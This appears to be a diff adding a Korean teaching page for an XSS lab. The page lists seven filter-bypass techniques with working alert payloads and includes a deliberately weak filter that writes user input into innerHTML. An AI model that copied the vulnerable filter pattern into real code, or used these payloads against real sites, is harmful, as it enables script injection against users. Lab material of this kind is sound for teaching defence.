@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <title>[실습] 필터 우회 기법 데모</title>
+  <style>
+    body { font-family: monospace; max-width: 900px; margin: 40px auto; padding: 20px; }
+    .vuln { background: #ffe0e0; border: 2px solid #c00; padding: 10px; border-radius: 4px; }
+    .box { background: #f5f5f5; padding: 15px; margin: 15px 0; border-radius: 4px; }
+    .technique { border: 1px solid #ccc; padding: 15px; margin: 10px 0; border-radius: 4px; }
+    .technique h4 { margin: 0 0 8px 0; color: #c00; }
+    code { background: #eee; padding: 2px 6px; font-size: 0.9em; }
+    pre { background: #eee; padding: 10px; border-radius: 4px; overflow-x: auto; }
+    .filter { background: #fff3cd; padding: 8px; border-radius: 4px; margin: 6px 0; }
+    input { width: 80%; padding: 6px; font-family: monospace; }
+    button { padding: 6px 14px; cursor: pointer; }
+    #filterOutput { min-height: 40px; padding: 10px; border: 1px solid #ccc; margin-top: 10px; }
+    .status { font-size: 0.85em; color: #666; }
+  </style>
+</head>
+<body>
+  <h2>[실습] XSS 필터 우회 기법 (xss.md 4장)</h2>
+  <div class="vuln">⚠️ 이 페이지는 실제 필터 우회를 실습하는 학습용 앱입니다.</div>
+
+  <!-- 약한 필터 시뮬레이터 -->
+  <div class="box">
+    <h3>약한 필터 시뮬레이터</h3>
+    <p>아래 필터는 소문자 <code>&lt;script&gt;</code> 태그만 제거합니다. 우회해보세요.</p>
+    <div class="filter">
+      <strong>적용 중인 필터:</strong> <code>input.replace(/&lt;script&gt;/gi, '')</code>... 잠깐, 이건 대소문자 구분 없이 제거하네요.<br>
+      <strong>실제 취약 필터:</strong> <code>input.replace(/&lt;script&gt;/g, '')</code> (소문자만)
+    </div>
+    <input type="text" id="filterInput" placeholder="페이로드를 입력하세요" />
+    <button onclick="runFilter()">필터 통과 테스트</button>
+    <div id="filterOutput">결과가 여기 나옵니다</div>
+  </div>
+
+  <h3>우회 기법 목록 (xss.md 4장)</h3>
+
+  <!-- B-01: 대소문자 혼합 -->
+  <div class="technique">
+    <h4>B-01. 대소문자 혼합 (Case Variation)</h4>
+    <p>방어 가정: 소문자 <code>&lt;script&gt;</code> 만 블랙리스트</p>
+    <pre>&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</pre>
+    <p>→ 소문자 필터를 우회하지만 브라우저는 대소문자 무관하게 실행</p>
+    <button onclick="testPayload('<ScRiPt>alert(\"B-01: 대소문자 우회 성공!\")<%2FsCrIpT>')">테스트</button>
+  </div>
+
+  <!-- B-02: 이벤트 핸들러 -->
+  <div class="technique">
+    <h4>B-02. 이벤트 핸들러 활용 (Event Handler)</h4>
+    <p>방어 가정: <code>&lt;script&gt;</code> 태그만 제거, 이벤트 핸들러 무시</p>
+    <pre>&lt;img src=x onerror=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;input autofocus onfocus=alert(1)&gt;</pre>
+    <p>→ script 태그 없이도 JS 실행 가능</p>
+    <button onclick="document.getElementById('eventDemo').innerHTML='<img src=x onerror=alert(\'B-02: 이벤트 핸들러 우회!\')'">테스트</button>
+    <div id="eventDemo"></div>
+  </div>
+
+  <!-- B-03: javascript: 프로토콜 -->
+  <div class="technique">
+    <h4>B-03. javascript: 프로토콜 (Protocol Handler)</h4>
+    <p>방어 가정: href 필터 없음</p>
+    <pre>&lt;a href="javascript:alert(1)"&gt;클릭하면 실행&lt;/a&gt;
+&lt;a href="javascript:void(0)" onclick="alert(1)"&gt;클릭&lt;/a&gt;</pre>
+    <p>직접 클릭해보세요:</p>
+    <a href="javascript:alert('B-03: javascript: 프로토콜 실행!')">클릭하면 alert 실행</a>
+  </div>
+
+  <!-- B-04: HTML 엔티티 인코딩 -->
+  <div class="technique">
+    <h4>B-04. HTML 엔티티 인코딩 (Entity Encoding)</h4>
+    <p>방어 가정: 단순 문자열 매칭 필터 (alert 단어를 차단)</p>
+    <pre>onerror=&#97;&#108;&#101;&#114;&#116;(1)
+&lt;!-- &#97; = a, &#108; = l, &#101; = e, &#114; = r, &#116; = t --&gt;</pre>
+    <p>→ 브라우저는 HTML 엔티티를 디코딩 후 실행</p>
+    <button onclick="document.getElementById('entityDemo').innerHTML='<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(\'B-04: 엔티티 인코딩 우회!\')>'">테스트</button>
+    <div id="entityDemo"></div>
+  </div>
+
+  <!-- B-05: URL 인코딩 -->
+  <div class="technique">
+    <h4>B-05. URL / 이중 인코딩 (Double URL Encoding)</h4>
+    <p>방어 가정: 서버가 1회 URL 디코딩 후 필터링, 2회 디코딩 후 출력</p>
+    <pre>%253Cscript%253E  →  (1차 디코딩) %3Cscript%3E  →  (2차 디코딩) &lt;script&gt;
+%3C = &lt;  (일반 URL 인코딩)
+%253C = %3C  (% 자체를 %25로 인코딩)</pre>
+    <p>→ 1회 디코딩만 하는 서버의 필터를 우회</p>
+  </div>
+
+  <!-- B-06: 속성 내 공백 제거 -->
+  <div class="technique">
+    <h4>B-06. 태그 내 공백 제거 (Attribute Obfuscation)</h4>
+    <p>방어 가정: 공백 기준으로 파싱하는 필터</p>
+    <pre>&lt;img/src=x/onerror=alert(1)&gt;
+&lt;img	src=x	onerror=alert(1)&gt;  &lt;!-- 탭 문자 --&gt;
+&lt;img %09 src=x onerror=alert(1)&gt;</pre>
+    <button onclick="document.getElementById('spaceDemo').innerHTML='<img/src=x/onerror=alert(\'B-06: 공백 제거 우회!\')>'">테스트</button>
+    <div id="spaceDemo"></div>
+  </div>
+
+  <!-- B-07: SVG 벡터 -->
+  <div class="technique">
+    <h4>B-07. SVG 네임스페이스 활용 (SVG Vector)</h4>
+    <p>HTML 파서와 SVG 파서의 차이를 이용</p>
+    <pre>&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;
+&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x&gt;&lt;/svg&gt;</pre>
+    <button onclick="document.getElementById('svgDemo').innerHTML='<svg><script>alert(\'B-07: SVG 우회!\')<\/script><\/svg>'">테스트</button>
+    <div id="svgDemo"></div>
+  </div>
+
+  <script>
+    // 약한 필터 함수 (소문자 <script>만 제거)
+    function weakFilter(input) {
+      // ❌ 취약한 필터: 소문자 script 태그만 제거
+      return input
+        .replace(/<script>/g, '[FILTERED]')
+        .replace(/<\/script>/g, '[/FILTERED]');
+      // 대소문자 혼합, 이벤트 핸들러 등은 통과됨
+    }
+
+    function runFilter() {
+      const input = document.getElementById('filterInput').value;
+      const filtered = weakFilter(input);
+      // ❌ 필터 통과한 값을 innerHTML에 삽입 (취약!)
+      document.getElementById('filterOutput').innerHTML = filtered;
+    }
+
+    function testPayload(payload) {
+      document.getElementById('filterOutput').innerHTML = decodeURIComponent(payload);
+    }
+  </script>
+</body>
+</html>
